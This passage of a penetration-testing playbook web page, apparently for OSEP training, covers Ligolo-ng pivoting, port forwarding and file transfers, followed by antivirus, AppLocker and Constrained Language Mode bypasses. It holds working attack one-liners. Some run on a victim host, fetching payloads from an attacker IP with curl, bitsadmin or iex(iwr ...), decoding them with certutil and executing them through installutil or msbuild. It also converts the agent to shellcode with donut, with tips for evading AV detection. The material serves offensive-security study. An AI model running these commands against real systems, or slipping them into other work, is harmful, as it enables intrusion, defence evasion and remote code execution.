<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">agent</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">connect &lt;IP of First Pivot Point&gt;:11601 </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ignore-cert</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Ligolo Agent Listener</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_02.png" alt="Ligolo Agent Listener" class="img_ev3q"></p>
<ol>
<li class="">
<p>Verify the connection on Kali by checking if the Windows agent has connected via the forwarded port.</p>
<p>Ligolo Agent Joined</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_03.png" alt="Ligolo Agent Joined" class="img_ev3q"></p>
</li>
<li class="">
<p>Start a tunnel and add a route</p>
</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> route </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">New_Network</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> dev ligolo_double</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>We&#x27;ll be able to interact with the new network from our Kali machine and run all the same tools as we did with the single pivot.</p>
<p>Ligolo Agent Session</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_04.png" alt="Ligolo Agent Session" class="img_ev3q"></p>
<p>Ligolo Add New Route</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_05.png" alt="Ligolo Add New Route" class="img_ev3q"></p>
<p>You could continue with a triple pivot using Ligolo-ng, following the same steps as we did with the double pivot.</p>
<p>Ligolo Tunnel Test</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_06.png" alt="Ligolo Tunnel Test" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="local-port-forwarding"><strong>Local Port Forwarding</strong><a href="#local-port-forwarding" class="hash-link" aria-label="Direct link to local-port-forwarding" title="Direct link to local-port-forwarding" translate="no">​</a></h3>
<p>Local port forwarding is useful when you encounter an internal server on the victim machine that only accepts connections from the local machine. By using a <strong>special hardcoded IP address</strong>, <code>Ligolo-ng</code> facilitates this process; to set up local port forwarding, <strong>follow these steps</strong>:</p>
<ol>
<li class=""><strong>Ensure Tunneling is Configured</strong>: make sure you have already established the tunneling with <code>Ligolo-ng</code> and that your network interface is set up correctly as <code>ligolo</code>.</li>
<li class=""><strong>Add the Special IP Address</strong>: use the following command to add a special IP address that <code>Ligolo-ng</code> recognizes as the local endpoint for port forwarding.</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Add a special hardcoded IP for local port forwarding.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">240.0</span><span class="token plain">.0.1/32 dev ligolo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Explanation</strong></p>
<ul>
<li class=""><strong><code>240.0.0.1/32</code></strong>: this is a special hardcoded IP address that <code>Ligolo-ng</code> understands; by adding this route, you inform the system to route traffic intended for this IP through the <code>ligolo</code> interface to the victim machine where the client is running.</li>
<li class=""><strong><code>dev ligolo</code></strong>: this specifies the device (or network interface) through which the routing will occur, ensuring that all traffic directed to <code>240.0.0.1</code> is channeled through the established tunnel.</li>
</ul>
<p><strong>Examples</strong>: just with that command we can now connect to the internal services of the victim machine, either by using commands or other types of services like HTTP.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">poiint㉿Kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ nmap </span><span class="token number" style="color:#36acaa">240.0</span><span class="token plain">.0.1 </span><span class="token parameter variable" style="color:#36acaa">-sV</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">22</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> OpenSSH </span><span class="token number" style="color:#36acaa">7</span><span class="token plain">.6p1 Ubuntu 4ubuntu0.3 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Ubuntu Linux</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> protocol </span><span class="token number" style="color:#36acaa">2.0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">80</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"> http Apache httpd </span><span class="token number" style="color:#36acaa">2.4</span><span class="token plain">.29 </span><span class="token variable punctuation" style="color:#393A34">((</span><span class="token variable" style="color:#36acaa">Ubuntu</span><span class="token variable punctuation" style="color:#393A34">))</span><span class="token number" style="color:#36acaa">631</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"> ipp CUPS </span><span class="token number" style="color:#36acaa">2.2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3306</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"> mysql MySQL </span><span class="token number" style="color:#36acaa">5.7</span><span class="token plain">.29-0ubuntu0.18.04.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service Info: OS: Linux</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Ligolo Port Forwarding</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png" alt="Ligolo Port Forwarding" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="file-transfers-from-internal-networks"><strong>File Transfers From Internal Networks</strong><a href="#file-transfers-from-internal-networks" class="hash-link" aria-label="Direct link to file-transfers-from-internal-networks" title="Direct link to file-transfers-from-internal-networks" translate="no">​</a></h3>
<ol>
<li class="">Setup a listener in the Ligolo session</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">listener_add </span><span class="token parameter variable" style="color:#36acaa">--addr</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">agent_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--to</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--tcp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Ligolo Agent Listener</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_07.png" alt="Ligolo Agent Listener" class="img_ev3q"></p>
<ol>
<li class="">Host the file in our Kali</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> http.server </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>HTTP Server</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_08.png" alt="HTTP Server" class="img_ev3q"></p>
<ol>
<li class="">Download the file on the compromised Windows host</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Invoke-WebRequest</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Uri </span><span class="token string" style="color:#e3116c">&quot;http://[agent_ip]:[agent_port]/[file_name]&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">OutFile </span><span class="token namespace" style="opacity:0.7">[file_name]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>HTTP Server</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_08.png" alt="HTTP Server" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="av-bypassing"><strong>AV Bypassing</strong><a href="#av-bypassing" class="hash-link" aria-label="Direct link to av-bypassing" title="Direct link to av-bypassing" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="agent-applocker-bypass"><strong>Agent AppLocker Bypass</strong><a href="#agent-applocker-bypass" class="hash-link" aria-label="Direct link to agent-applocker-bypass" title="Direct link to agent-applocker-bypass" translate="no">​</a></h3>
<ul>
<li class=""><a href="https://github.com/LorisDietrich/ApplockerBypassExternalBinary" target="_blank" rel="noopener noreferrer" class="">GitHub Reference</a></li>
</ul>
<p><strong>Steps</strong></p>
<ol>
<li class="">
<p>Modify the file <code>/ligolo-ng/cmd/agent/main.go</code>, like below so that it points to your IP.</p>
<p>Ligolo Code Modification</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo1.png" alt="Ligolo Code Modification" class="img_ev3q"></p>
</li>
<li class="">
<p>Compile the code</p>
</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># From Kali</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">GOOS</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">windows go build </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> agent.exe cmd/agent/main.go</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Here you have two options, use the already compile file <code>ApplockerBypassExternalBinary.exe</code> from the GitHub or build you own using the solution provided in the folder <code>ApplockerBypassExternalBinary</code>, if you are building your own executable do the following:<!-- -->
<ol>
<li class="">Add required reference: Add the System.Configuration.Install reference to the project.</li>
<li class="">Compile the project: Ensure the project is compiled as <strong>Release</strong> and <strong>x64</strong> for compatibility.</li>
</ol>
</li>
<li class="">Encode the executable with <code>certutil</code></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># From Windows</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certutil </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">encode </span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\ApplockerBypassExternalBinary</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe AppLockerBypassLigolo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Rename <code>agent.exe</code> to <code>ligolo-agent.exe</code></li>
<li class="">Download and execute from victim</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Option 1 - curl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;curl http://[ATTACKER_IP]/ligolo-agent.exe -o C:\users\public\try-agent.exe &amp;&amp; curl http://[ATTACKER_IP]/AppLockerBypassLigolo.txt -o C:\users\public\enc.txt &amp;&amp; certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe &amp;&amp; del C:\users\public\enc.txt &amp;&amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Option 2 - bitsadmin</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;bitsadmin /Transfer myJob http://[ATTACKER_IP]/ligolo-agent.exe C:\users\public\try-agent.exe &amp;&amp; cmd /c bitsadmin /Transfer myJob http://[ATTACKER_IP]/pyhttp/AppLockerBypassLigolo.txt C:\users\public\enc.txt &amp;&amp; certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe &amp;&amp; del C:\users\public\enc.txt &amp;&amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="agent-clm-bypass"><strong>Agent CLM Bypass</strong><a href="#agent-clm-bypass" class="hash-link" aria-label="Direct link to agent-clm-bypass" title="Direct link to agent-clm-bypass" translate="no">​</a></h3>
<ul>
<li class=""><a href="https://github.com/emmasolis1/OSEP" target="_blank" rel="noopener noreferrer" class="">GitHub Reference</a></li>
</ul>
<p><strong>Steps</strong></p>
<ol>
<li class="">Update <code>ligolo.ps1</code> on line 14 and put our IP Address.</li>
<li class="">Update <code>ligolo-clmbypass.xml</code> on line 36 and put our IP Address.</li>
<li class="">Download <code>ligolo-clmbypass.xml</code> and execute it from the victim</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\Microsoft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">NET\Framework64\v4</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">30319\msbuild</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe ligolo-clmbypass</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">(Optional) If this script <code>ligolo.ps1</code> is caught by the AV, use the <code>ligolo-psrunner.ps1</code> as alternative as it uses NT APIs only with sleeps between sensitive operations.</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="agent-shellcode-runner"><strong>Agent Shellcode Runner</strong><a href="#agent-shellcode-runner" class="hash-link" aria-label="Direct link to agent-shellcode-runner" title="Direct link to agent-shellcode-runner" translate="no">​</a></h3>
<ul>
<li class=""><a href="https://github.com/emmasolis1/OSEP" target="_blank" rel="noopener noreferrer" class="">GitHub Reference</a></li>
</ul>
<p><strong>Requirements</strong></p>
<ul>
<li class="">Agent for victim: <code>agent.exe</code></li>
<li class="">File <code>ligolo.ps1</code></li>
<li class="">Running in a x64bit process, check with:<!-- -->
<ul>
<li class="">Powershell: <code>[Environment]::Is64BitProcess</code></li>
<li class="">CMD: <code>set p</code> (Should show <code>PROCESSOR_ARCHITECTURE=AMD64</code>)</li>
</ul>
</li>
</ul>
<p><strong>Steps</strong></p>
<ol>
<li class="">Convert <code>agent.exe</code> to shellcode</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># From Kali</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">donut </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> agent.bin </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;-connect [ATTACKER_IP]:11601 -ignore-cert&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> agent.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Update <code>ligolo.ps1</code> on line 14 and put our IP Address.</li>
<li class="">(Optional) If this script <code>ligolo.ps1</code> is caught by the AV, use the <code>ligolo-psrunner.ps1</code> as alternative as it uses NT APIs only with sleeps between sensitive operations.</li>
<li class="">Download and execute Ligolo from the victim</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Direct memory loading</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">iex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">iwr</span><span class="token plain"> http:</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">/</span><span class="token namespace" style="opacity:0.7">[ATTACKER_IP]</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">ligolo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ps1 </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">UseBasicParsing</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/OSEP-Playbook/osep/initial-access/Upgrading Shells"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Upgrading Shells</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/OSEP-Playbook/osep/Tunneling/Metasploit"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Metasploit</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#normal-instructions" class="table-of-contents__link toc-highlight"><strong>Normal Instructions</strong></a></li><li><a href="#simple-tunneling" class="table-of-contents__link toc-highlight"><strong>Simple Tunneling</strong></a></li><li><a href="#reverse-shells-from-internal-networks" class="table-of-contents__link toc-highlight"><strong>Reverse Shells From Internal Networks</strong></a></li><li><a href="#double-tunneling" class="table-of-contents__link toc-highlight"><strong>Double Tunneling</strong></a></li><li><a href="#local-port-forwarding" class="table-of-contents__link toc-highlight"><strong>Local Port Forwarding</strong></a></li><li><a href="#file-transfers-from-internal-networks" class="table-of-contents__link toc-highlight"><strong>File Transfers From Internal Networks</strong></a></li><li><a href="#av-bypassing" class="table-of-contents__link toc-highlight"><strong>AV Bypassing</strong></a></li><li><a href="#agent-applocker-bypass" class="table-of-contents__link toc-highlight"><strong>Agent AppLocker Bypass</strong></a></li><li><a href="#agent-clm-bypass" class="table-of-contents__link toc-highlight"><strong>Agent CLM Bypass</strong></a></li><li><a href="#agent-shellcode-runner" class="table-of-contents__link toc-highlight"><strong>Agent Shellcode Runner</strong></a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>